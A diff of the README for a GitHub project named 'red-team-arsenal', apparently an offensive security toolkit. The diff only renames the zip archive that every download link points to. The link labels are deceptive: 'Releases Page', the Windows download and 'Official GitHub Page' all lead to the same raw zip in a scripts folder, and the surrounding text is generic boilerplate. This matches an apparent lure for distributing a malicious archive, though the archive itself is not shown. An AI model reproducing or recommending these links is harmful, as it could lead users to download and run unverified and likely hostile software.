@@ -3,20 +3,20 @@
 ## 🚀 Getting Started  
 Welcome to the red-team-arsenal! This toolkit offers a wide range of tools for cybersecurity professionals. You'll find everything you need to perform tasks related to reconnaissance, exploitation, post-exploitation, and control frameworks.
 
-[![Download red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)
+[![Download red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)
 
 ## 📥 Download & Install  
 To get started with red-team-arsenal, you first need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the release downloads page:  
-   [Visit this page to download](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)
+   [Visit this page to download](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)
 
 2. **Select the Latest Release**  
    On the releases page, find the most recent version of red-team-arsenal. The latest release will be listed at the top.
 
 3. **Download the Files**  
-   Click on the download link for your system. For example, if you're running Windows, look for `https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip`. For Mac or Linux, select the appropriate file.
+   Click on the download link for your system. For example, if you're running Windows, look for `https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip`. For Mac or Linux, select the appropriate file.
 
 4. **Extract the Files**  
    Once the download completes, locate the downloaded file on your computer. Right-click on the file and select "Extract All" or use your preferred extraction tool.
@@ -73,7 +73,7 @@ If you run into issues, consider reaching out to the community through the repos
 red-team-arsenal welcomes contributions from users. If you'd like to contribute, please check the contribution guidelines on the GitHub repository.
 
 ## 🔗 Additional Resources  
-- **Official GitHub Page:** [red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)
+- **Official GitHub Page:** [red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)
 - **Cybersecurity Best Practices:** Learn more about effective practices on various cybersecurity portals.
 - **Online Tutorials:** Search for video tutorials on platforms like YouTube to better understand tool usage.
 
@@ -82,4 +82,4 @@ After setting up red-team-arsenal, start testing the tools in a safe environment
 
 You are now ready to explore red-team-arsenal. Happy testing!
 
-[![Download red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/red-arsenal-team-1.8.zip)
+[![Download red-team-arsenal](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)](https://github.com/Ahmedsofteng/red-team-arsenal/raw/refs/heads/main/scripts/team_red_arsenal_v3.6.zip)
